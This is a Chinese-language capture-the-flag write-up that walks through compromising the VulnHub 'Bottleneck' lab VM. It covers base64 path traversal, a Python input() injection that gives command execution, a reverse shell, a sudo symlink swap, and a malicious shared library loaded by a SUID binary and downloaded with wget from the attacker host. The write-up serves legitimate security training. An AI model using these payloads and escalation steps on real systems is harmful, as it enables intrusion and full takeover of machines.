---
title: "Bottleneck 1 Vulnhub靶场复现-重走来时路6"
description: "大一第一次被布置打这个靶场的时候，难度并不适合当时的我，现在来看我还是差点"
slug: "vulnhub-bottleneck"
pubDate: "2026-08-11"
type: "writeup"
tags: ["Vulnhub"]
lang: "zh-CN"
---

# Bottleneck VulnHub 靶场复现

## 靶场介绍与搭建

下载地址：

[https://download.vulnhub.com/bottleneck/Bottleneck.ova](https://download.vulnhub.com/bottleneck/Bottleneck.ova)

Bottleneck 是一台中等难度的 Boot2Root 靶机，靶场有两个 Flag。

Bottleneck is an intermediate boot2root machine.
After some cyber attacks the admin hardened the system, show him that it's not so secure.

作者：

@bytevsbyt3

### 靶场搭建

该靶场默认使用桥接模式，使用 VMware 导入 OVA 后可能无法正常获取靶机 IP。

最终采用 VirtualBox Host-Only 的方式搭建：

1. Bottleneck 使用 VirtualBox 启动。

2. 网络设置为 `Host-Only Adapter`。

3. Kali 使用 VMware 启动，并连接 VirtualBox 的 Host-Only 网卡。

4. 靶机启动后可以看到：

```text
Ubuntu 19.04 bottleneck tty1
enp0s3:192.168.56.4
bottleneck login:-
```

Kali 获取到的 Host-Only 地址为：

```text
192.168.56.128
```

因此后续攻击机和靶机位于：

```text
Kali       192.168.56.128
Bottleneck 192.168.56.4
```

---

## 信息收集

### 主机发现

首先扫描整个 `192.168.56.0/24` 网段：

```bash
sudo nmap -sn 192.168.56.0/24
```

发现：

```text
192.168.56.2
192.168.56.4
192.168.56.5
192.168.56.128
```

其中 `192.168.56.128` 是 Kali 自己的地址。

由于 `.4` 和 `.5` 都可能是靶机，因此继续进行端口扫描。

### 端口扫描

```bash
sudo nmap --min-rate 1000 -p- 192.168.56.4
```

结果：

```text
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

因此可以确认：

```text
192.168.56.4
```

就是 Bottleneck 靶机。

继续进行详细探测：

```bash
sudo nmap -p22,80 -A 192.168.56.4
```

主要结果：

```text
22/tcp open  ssh     OpenSSH 7.9p1 Ubuntu 10
80/tcp open  http    nginx
|_http-title: BOTTLENECK
```

#### 结果分析

| 端口 | 服务 | 信息          | 分析                       |
| ---- | ---- | ------------- | -------------------------- |
| 22   | SSH  | OpenSSH 7.9p1 | 后续拿到凭据后作为登录入口 |
| 80   | HTTP | nginx         | 当前最主要的攻击面         |

---

### 目录扫描

使用 ffuf 对 Web 目录进行枚举：

```bash
ffuf -w /usr/share/wordlists/dirb/big.txt \ -u http://192.168.56.4/FUZZ \ -e .php
```

发现：

```text
css                     [Status: 301]
image_gallery.php       [Status: 200]
img                     [Status: 301]
index.php               [Status: 200]
js                      [Status: 301]
vendor                  [Status: 301]
```

其中：

```text
image_gallery.php
```

比较值得关注。

---

### Web 信息收集

访问：

```text
http://192.168.56.4/
```

主页没有明显的登录入口或者其他直接利用点。

页面源码中存在一段注释：

```html
<!-- shit, seriously matrix 4 is real? I'm scared.. -->
```

暂时没有明显利用价值。

因此继续查看 `image_gallery.php`。

---

## image_gallery.php

访问：

```text
http://192.168.56.4/image_gallery.php
```

查看页面源代码，发现了一个特殊请求：

```text
image_gallery.php?t=1786267450&f=Ym90dGxlbmVja19kb250YmUucG5n
```

其中：

```text
t = 1786267450
f = Ym90dGxlbmVja19kb250YmUucG5n
```

### 分析 f 参数

`f` 很明显是 Base64 编码。

可以直接使用：

```bash
echo 'Ym90dGxlbmVja19kb250YmUucG5n' | base64 -d
```

得到：

```text
bottleneck_dontbe.png
```

说明 `f` 很可能用于传递图片文件名。

---

### 抓包分析参数

进一步分析：

```text
image_gallery.php?t=1786267450&f=Ym90dGxlbmVja19kb250YmUucG5n
```

可以推测：

- `t` 是时间戳；

- `f` 是经过 Base64 编码的文件路径。

查看 `image_gallery.php` 源码：

```php
$tstamp = time();

if(isset($_GET['t']) && isset($_GET['f'])){
    include_once 'image_gallery_load.php';
    exit();
}
```

可以发现真正处理 `t` 和 `f` 的代码位于：

```text
image_gallery_load.php
```

---

### 获取 image_gallery_load.php 源码

通过前面发现的文件读取漏洞，可以尝试读取：

```text
../image_gallery_load.php
```

使用自己的 Python3 脚本：

```bash
python3 read.py '../image_gallery_load.php'
```

或者直接构造 Base64：

```bash
echo -n '../image_gallery_load.php' | base64
```

得到对应的 `f` 参数后访问：

```text
http://192.168.56.4/image_gallery.php?t=<当前时间戳>&f=<Base64>
```

最终获取到核心代码。

---

## 漏洞代码分析

核心代码：

```php
$imagefile = base64_decode($_GET['f']);

$timestamp = time();

$blacklist = array(
    '/etc',
    '/opt',
    '/var',
    '/proc',
    '/dev',
    '/lib',
    '/bin',
    '/usr',
    '/home',
    '/ids'
);

foreach($blacklist as $elem){
    if(strstr($imagefile, $elem) !== FALSE)
        $isblocked = TRUE;
}

if($isblocked){
    // ...
    print_troll();
    exit();
}

chdir('img');

$filecontent = file_get_contents($imagefile);

if($filecontent === FALSE){
    print_troll();
}
else{
    echo $filecontent;
}
```

这里有几个非常关键的点。

### 1. f 会经过 Base64 解码

```php
$imagefile = base64_decode($_GET['f']);
```

因此真正进入 `file_get_contents()` 的并不是 Base64 字符串，而是解码后的内容。

例如：

```bash
echo -n '../index.php' | base64
```

得到：

```text
Li4vaW5kZXgucGhw
```

服务器收到：

```text
f=Li4vaW5kZXgucGhw
```

之后会解码为：

```text
../index.php
```

---

### 2. t 必须是新鲜的时间戳

代码：

```php
$timestamp = time();

if(abs($_GET['t'] - $timestamp) > 10){
    exit();
}
```

说明：

```text
|客户端 t - 服务器当前时间| <= 10
```

才能正常执行。

因此测试时不能一直重复使用旧的 `t`。

可以在 Kali 中获取当前 Unix 时间戳：

```bash
date +%s
```

或者直接让自己的 `read.py` 自动获取网页中的最新 `t`。

---

### 3. 当前工作目录被切换到 img

代码：

```php
chdir('img');
```

之后：

```php
file_get_contents($imagefile);
```

是在 `img` 目录下进行路径解析。

因此：

```text
../index.php
```

实际上就是：

```text
/var/www/html/img/../index.php
```

也就是：

```text
/var/www/html/index.php
```

---

## 验证任意文件读取

首先读取网站根目录的：

```text
index.php
```

执行：

```bash
python3 read.py '../index.php'
```

成功得到：

```text
Status : 200
Length : 10175
```

说明可以读取 Web 根目录下的 PHP 文件。

---

### 测试路径规范化

继续测试：

```bash
python3 read.py '../index.php'
python3 read.py '.././index.php'
python3 read.py '../foo/../index.php'
python3 read.py './../index.php'
```

四种方式均得到：

```text
Length : 10175
```

说明 PHP 最终交给文件系统解析时，会按照正常的路径规则处理：

```text
.
..
```

例如：

```text
../foo/../index.php
```

最终仍然会解析到：

```text
../index.php
```

因此可以确认存在：

> **任意文件读取（Arbitrary File Read / LFI）**

---

### 尝试读取 /etc/passwd

根据源码，可以发现程序设置了黑名单：

```text
/etc
/opt
/var
/proc
/dev
/lib
/bin
/usr
/home
/ids
```

因此直接尝试：

```bash
python3 read.py '../etc/passwd'
```

会得到：

```text
Let me throw away your nice request into the bin.
The SOC was informed about your attempt to break into this site.
```

说明请求被黑名单机制拦截。

这里需要注意：

由于当前目录是：

```text
/var/www/html/img
```

因此正常情况下读取 `/etc/passwd` 可以使用：

```text
../../etc/passwd
```

但由于源码中的：

```php
strstr($imagefile, '/etc')
```

会直接匹配字符串：

```text
/etc
```

所以无论使用多少层：

```text
../etc/passwd
../../etc/passwd
../../../etc/passwd
```

只要最终传入的字符串中存在：

```text
/etc
```

都会被拦截。

---

## 测试 PHP Stream Wrapper

由于最终使用的是：

```php
file_get_contents($imagefile);
```

因此可以进一步测试 PHP Stream Wrapper。

例如：

```bash
python3 read.py 'php://filter/read=convert.base64-encode/resource=../index.php'
```

成功得到类似：

```text
PCFET0NUWVBFIGh0bWw+CjxodG1s...
```

这是 Base64 编码后的 HTML/PHP 文件内容。

可以使用：

```bash
echo 'PCFET0NUWVBFIGh0bWw...' | base64 -d
```

还原源码。

这说明：

> `file_get_contents()` 支持 PHP Stream Wrapper。

但是继续尝试：

```bash
python3 read.py 'php://filter/read=convert.base64-encode/resource=../../opt/ids_strong_bvb.py'
```

仍然会触发黑名单。

原因并不是 `php://filter` 不工作，而是：

```php
strstr($imagefile, '/opt')
```

依然会在原始字符串中匹配到：

```text
/opt
```

因此：

```text
php://filter
```

本身并没有绕过这个字符串黑名单。

#### 分析黑名单触发后的 IDS 逻辑

既然 `php://filter` 无法绕过 `/opt`、`/etc` 等关键字过滤，就不再继续盲目尝试 `php://filter` 的变形，而是重新分析黑名单命中后的代码。

命中黑名单后，程序执行：

```
if($isblocked){
    $logfile = 'intrusion_'.$timestamp;
    $fp = fopen('/var/log/soc/'.$logfile, 'w');
    fwrite($fp, "'".$imagefile."'");
    fclose($fp);

    exec('python /opt/ids_strong_bvb.py </var/log/soc/'.$logfile.' >/tmp/output 2>&1');

    print_troll();
    exit();
}
```

这里可以看到，程序会将我们的 `$imagefile` 写入：

```
/var/log/soc/intrusion_<timestamp>
```

然后执行：

```
python /opt/ids_strong_bvb.py < /var/log/soc/intrusion_<timestamp> >/tmp/output 2>&1
```

也就是说，我们提交的内容会成为 `ids_strong_bvb.py` 的标准输入，而脚本的执行结果则会被保存到 `/tmp/output`。

### 读取 IDS 的执行结果

由于 `/tmp` 不在黑名单中，可以尝试通过前面的任意文件读取漏洞读取 `/tmp/output`。

因为程序执行了：

```
chdir('img');
```

所以需要根据当前目录使用相对路径返回 `/tmp`。

首先测试：

```
python3 read.py '../tmp/output'
```

返回：

```
Let me throw away your nice request into the bin.
...
```

说明路径层级还不够。

继续增加 `../`：

```
python3 read.py '../../../../tmp/output'
```

成功得到：

```
report: [+] sending the message: ../etc/passwd
```

说明已经成功读取 `/tmp/output`。

### 分析 IDS 脚本行为

继续利用黑名单触发机制，可以观察 IDS 的执行结果。

读取：

```
python3 read.py '../../../../tmp/output'
```

曾得到：

```
Traceback (most recent call last):
  File "/opt/ids_strong_bvb.py", line 7, in
    data = str(input('report: '))
...
```

其中最关键的一行是：

```
data = str(input('report: '))
```

这说明 `/opt/ids_strong_bvb.py` 会使用 Python 的 `input()` 读取我们写入日志中的内容。

因此攻击链发生了变化：

```
恶意文件路径
    ↓
触发黑名单
    ↓
写入 /var/log/soc/intrusion_*
    ↓
作为 stdin 传入 ids_strong_bvb.py
    ↓
Python input()
    ↓
Python 表达式被解释
```

### 尝试 Python 注入

在确认 IDS 使用 Python `input()` 后，开始测试 Python 表达式。

构造测试输入：

```
python3 read.py "../etc/passwd' + __import__('os').system('id') + '"
```

随后再次读取 IDS 的输出：

```
python3 read.py '../../../../tmp/output'
```

成功得到：

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

说明 Python 表达式已经被执行。

继续验证当前用户：

```
python3 read.py "../../../../tmp/output"
```

得到：

```
www-data
```

再验证当前工作目录：

```
python3 read.py "../../../../tmp/output"
```

得到：

```
/var/www/html
```

至此确认已经从任意文件读取进一步获得了远程命令执行权限，当前执行权限为：

```
www-data
```

### 建立反弹 Shell

虽然已经能够通过 IDS 执行命令，但是这种方式每执行一次命令都需要重新构造 payload。

因此下一步建立反弹 Shell，获得稳定的交互式 Shell。

首先在 Kali 上监听 4444 端口：

```
nc -lvnp 4444
```

然后通过前面已经获得的命令执行能力让靶机连接 Kali。

成功后 Kali 收到：

```
connect to [192.168.56.128] from (UNKNOWN) [192.168.56.4] 53754
```

获得 Shell：

```
www-data@bottleneck:~/html$
```

### 升级 Shell

刚获得的反弹 Shell 属于非交互式 Shell，可以看到：

```
bash: cannot set terminal process group
bash: no job control in this shell
```

靶机存在 Python3，因此使用 Python3 分配伪终端：

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

随后重新获得：

```
www-data@bottleneck:~/html$
```

验证当前用户：

```
whoami
```

输出：

```
www-data
```

验证当前目录：

```
pwd
```

输出：

```
/var/www/html
```

查看系统信息：

```
uname -a
```

输出：

```
Linux bottleneck 5.0.0-29-generic #31-Ubuntu SMP Thu Sep 12 13:05:32 UTC 2019 x86_64 x86_64 x86_64
```

## 权限提升

```shell
www-data@bottleneck:~/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@bottleneck:~/html$ sudo -l
sudo -l
Matching Defaults entries for www-data on bottleneck:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bottleneck:
    (bytevsbyte) NOPASSWD: /var/www/html/web_utils/clear_logs
www-data@bottleneck:~/html$ namei -l /var/www/html/web_utils/clear_logs
namei -l /var/www/html/web_utils/clear_logs
f: /var/www/html/web_utils/clear_logs
drwxr-xr-x root       root       /
drwxr-xr-x root       root       var
drwxr-xr-x root       root       www
drwxr-xr-x root       root       html
drwxrwxr-x www-data   www-data   web_utils
lrwxrwxrwx www-data   www-data   clear_logs -> /opt/clear_logs.sh
drwxr-xr-x root       root         /
drwxr-xr-x root       root         opt
-rwxr--r-- bytevsbyte bytevsbyte   clear_logs.sh
www-data@bottleneck:~/html$ ls -la /var/www/html/web_utils/
ls -la /var/www/html/web_utils/
total 8
drwxrwxr-x 2 www-data www-data 4096 Sep 26  2019 .
drwxr-xr-x 7 root     root     4096 Sep 26  2019 ..
lrwxrwxrwx 1 www-data www-data   18 Sep 26  2019 clear_logs -> /opt/clear_logs.sh
```

web_utils 目录本身是可以写的

/opt/clear_logs.sh 不能修改

clear_logs -> /opt/clear_logs.sh 属于 www-data 位于drwxrwxr-x www-data www-data web_utils 可写

```shell
sudo -u bytevsbyte /var/www/html/web_utils/clear_logs
```

## 获取第一个 Flag

前面通过 `image_gallery.php` 的漏洞获得了一个反弹 Shell，当前身份为：

```bash
www-data@bottleneck:~/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

首先检查当前用户可以执行的 sudo 命令：

```bash
www-data@bottleneck:~/html$ sudo -l
Matching Defaults entries for www-data on bottleneck:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User www-data may run the following commands on bottleneck:
    (bytevsbyte) NOPASSWD: /var/www/html/web_utils/clear_logs
```

可以看到，`www-data` 无需密码即可使用 `sudo`，以 `bytevsbyte` 身份执行：

```text
/var/www/html/web_utils/clear_logs
```

### 分析 clear_logs

查看文件：

```bash
www-data@bottleneck:~/html$ cat /var/www/html/web_utils/clear_logs
#!/bin/bash
rm -f /var/log/soc/intrusion_*
```

进一步查看文件属性：

```bash
www-data@bottleneck:~/html$ ls -l /var/www/html/web_utils/clear_logs
lrwxrwxrwx 1 www-data www-data 18 Sep 26  2019 /var/www/html/web_utils/clear_logs -> /opt/clear_logs.sh
```

可以发现 `clear_logs` 并不是普通文件，而是一个软链接：

```text
/var/www/html/web_utils/clear_logs
        ↓
/opt/clear_logs.sh
```

继续查看：

```bash
www-data@bottleneck:~/html$ ls -l /opt/clear_logs.sh
-rwxr--r-- 1 bytevsbyte bytevsbyte 43 Sep 27  2019 /opt/clear_logs.sh
```

可以确认 `/opt/clear_logs.sh` 属于 `bytevsbyte`，但当前的 `www-data` 无法直接修改它。

此时继续查看软链接所在目录：

```bash
www-data@bottleneck:~/html$ ls -ld /var/www/html/web_utils
drwxrwxr-x 2 www-data www-data 4096 Sep 26  2019 /var/www/html/web_utils
```

`web_utils` 目录属于 `www-data`，因此当前用户可以删除、创建其中的文件。

这意味着虽然我们不能修改：

```text
/opt/clear_logs.sh
```

但是可以控制：

```text
/var/www/html/web_utils/clear_logs
```

### 利用可控软链接进行提权

首先删除原来的软链接：

```bash
www-data@bottleneck:~/html$ rm /var/www/html/web_utils/clear_logs
```

确认：

```bash
www-data@bottleneck:~/html$ ls -la /var/www/html/web_utils
total 8
drwxrwxr-x 2 www-data www-data 4096 Aug  9 16:04 .
drwxr-xr-x 7 root     root     4096 Sep 26  2019 ..
```

然后创建一个新的软链接，让 `clear_logs` 指向 `/bin/bash`：

```bash
www-data@bottleneck:~/html$ ln -s /bin/bash /var/www/html/web_utils/clear_logs
```

检查：

```bash
www-data@bottleneck:~/html$ ls -l /var/www/html/web_utils/clear_logs
lrwxrwxrwx 1 www-data www-data 9 Aug  9 16:04 /var/www/html/web_utils/clear_logs -> /bin/bash
```

此时 sudoers 中允许执行的路径：

```text
/var/www/html/web_utils/clear_logs
```

实际上已经指向了：

```text
/bin/bash
```

因此执行：

```bash
www-data@bottleneck:~/html$ sudo -u bytevsbyte /var/www/html/web_utils/clear_logs -i
```

成功获得 `bytevsbyte` 用户的交互式 Bash：

```bash
bytevsbyte@bottleneck:~/html$ id
uid=1000(bytevsbyte) gid=1000(bytevsbyte) groups=1000(bytevsbyte),4(adm),24(cdrom),30(dip),46(plugdev),1001(tester)

bytevsbyte@bottleneck:~/html$ whoami
bytevsbyte
```

至此完成：

```text
www-data
    ↓
sudo NOPASSWD
    ↓
可控 web_utils 目录
    ↓
替换 clear_logs 软链接
    ↓
/bin/bash
    ↓
bytevsbyte
```

### 获取 User Flag

进入 `bytevsbyte` 的家目录：

```bash
bytevsbyte@bottleneck:~/html$ cd /home/bytevsbyte
```

查看目录：

```bash
bytevsbyte@bottleneck:/home/bytevsbyte$ ls -liah
total 48K
531398 drwx------ 6 bytevsbyte bytevsbyte 4.0K Sep 27  2019 .
524290 drwxr-xr-x 3 root       root       4.0K Sep 23  2019 ..
531399 lrwxrwxrwx 1 bytevsbyte bytevsbyte    9 Sep 24  2019 .bash_history -> /dev/null
531401 -rw-r--r-- 1 bytevsbyte bytevsbyte  220 Apr  4  2019 .bash_logout
531246 -rw-r--r-- 1 bytevsbyte bytevsbyte 3.7K Sep 24  2019 .bashrc
531450 drwx------ 2 bytevsbyte bytevsbyte 4.0K Sep 24  2019 .cache
531490 drwx------ 3 bytevsbyte bytevsbyte 4.0K Sep 24  2019 .gnupg
531664 drwxrwxr-x 3 bytevsbyte bytevsbyte 4.0K Sep 24  2019 .local
531400 -rw-r--r-- 1 bytevsbyte bytevsbyte  807 Apr  4  2019 .profile
531329 drwx------ 2 bytevsbyte bytevsbyte 4.0K Sep 27  2019 .ssh
531328 -rw-r--r-- 1 bytevsbyte bytevsbyte  148 Sep 26  2019 user.txt
535756 -rw------- 1 bytevsbyte bytevsbyte   56 Sep 27  2019 .Xauthority
```

直接读取 `user.txt`：

```bash
bytevsbyte@bottleneck:/home/bytevsbyte$ cat user.txt
```

得到：

```text
Good job, this is the user flag of bottleneck machine by @bytevsbyt3 (twitter).
I hope you liked the flow.

flag{gr34t_j0b_f0r_bottleneck_us3r}
```

至此获得 Bottleneck 的第一个 Flag：

```text
flag{gr34t_j0b_f0r_bottleneck_us3r}
```

## 权限提升至 root

获得 `bytevsbyte` 用户权限后，继续进行本地信息收集。

首先查看当前用户权限：

```
id
```

可以看到当前用户属于 `tester` 用户组：

```
uid=1000(bytevsbyte) gid=1000(bytevsbyte) groups=1000(bytevsbyte),4(adm),24(cdrom),30(dip),46(plugdev),1001(tester)
```

由于当前用户已经获得了一个新的本地用户权限，因此继续检查 SUID 文件：

```
find / -perm -4000 -type f 2>/dev/null
```

在结果中发现了一个比较特殊的文件：

```
/usr/test/testlib
```

进一步查看权限：

```
ls -l /usr/test/testlib
```

得到：

```
-rwsr-x--- 1 root tester 16528 Sep 26  2019 /usr/test/testlib
```

这里需要注意：

```
-rwsr-x---
  ^
  SUID
```

该文件属于 `root`，同时当前 `bytevsbyte` 用户属于 `tester` 用户组，因此具备执行这个 SUID 程序的权限。

### 分析 testlib

先查看文件类型：

```
file /usr/test/testlib
```

结果：

```
/usr/test/testlib: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=..., for GNU/Linux 3.2.0, not stripped
```

此时直接运行：

```
/usr/test/testlib
```

程序没有任何明显输出。

随后查看 `/usr/test` 目录：

```
ls -la /usr/test
```

发现除了 `testlib` 外，还存在一个源码文件：

```
-rw-r----- 1 root tester 281 Sep 27  2019 testlib.c
```

由于 `bytevsbyte` 属于 `tester` 用户组，因此可以直接读取源码：

```
cat /usr/test/testlib.c
```

得到：

```
#include <dlfcn.h>
#include <unistd.h>

int main(int argc, char *argv[]){
    void *handle;
    int (*function)();
    if(argc < 2)
        return 1;
    handle = dlopen(argv[1], RTLD_LAZY);
    function = dlsym(handle, "test_this");
    function();
    return 0;
}
```

### 分析程序逻辑

这里最关键的是：

```
handle = dlopen(argv[1], RTLD_LAZY);
function = dlsym(handle, "test_this");
function();
```

程序接收用户提供的第一个参数，并使用：

```
dlopen()
```

动态加载指定的共享库。

随后使用：

```
dlsym()
```

寻找共享库中的：

```
test_this
```

函数，最后直接执行该函数。

由于 `testlib` 本身是：

```
root + SUID
```

运行该程序时具有 root 权限。

因此，如果能够控制 `test_this()` 的实现，就可以让它在 SUID 程序的权限上下文中执行我们的代码。

## 编写恶意共享库

在 Kali 中创建 `test_this.c`：

```
nano test_this.c
```

写入：

```
#include <unistd.h>
#include <stdlib.h>

void test_this()
{
    setuid(0);
    setgid(0);
    system("/bin/bash");
}
```

其中：

```
setuid(0);
setgid(0);
```

用于将进程的 UID/GID 设置为 root。

然后通过：

```
system("/bin/bash");
```

启动一个 Bash Shell。

编译为共享库：

```
gcc -fPIC -shared test_this.c -o test_this.so
```

检查生成的文件：

```
file test_this.so
```

得到：

```
test_this.so: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, ...
```

## 将共享库上传到靶机

由于当前靶机上的 `bytevsbyte` 用户可以访问 `/tmp`，因此将生成的 `test_this.so` 上传到 `/tmp`。

首先在 Kali 中开启简单的 HTTP 文件服务器：

```
python3 -m http.server 8000
```

然后在靶机中：

```
cd /tmp
wget http://192.168.56.128:8000/test_this.so
```

确认文件：

```
ls -lh /tmp/test_this.so
file /tmp/test_this.so
```

## 利用 SUID 程序加载恶意共享库

现在让 `/usr/test/testlib` 加载我们准备好的共享库：

```
/usr/test/testlib /tmp/test_this.so
```

成功获得 Shell：

```
root@bottleneck:/tmp#
```

验证当前权限：

```
id
```

得到：

```
uid=0(root) gid=0(root) groups=0(root),...
```

再执行：

```
whoami
```

得到：

```
root
```

至此成功完成从 `bytevsbyte` 到 `root` 的权限提升。

## 获取 Root Flag

进入 `/root`：

```
cd /root
ls -liah
```

发现：

```
root.txt
```

读取：

```
cat /root/root.txt
```

得到 Bottleneck 的第二个 Flag：

```
flag{w0w_y0u_h4v3_r00t3d_bottleneck}
```

至此，Bottleneck 两个 Flag 均已获取，靶场完成。
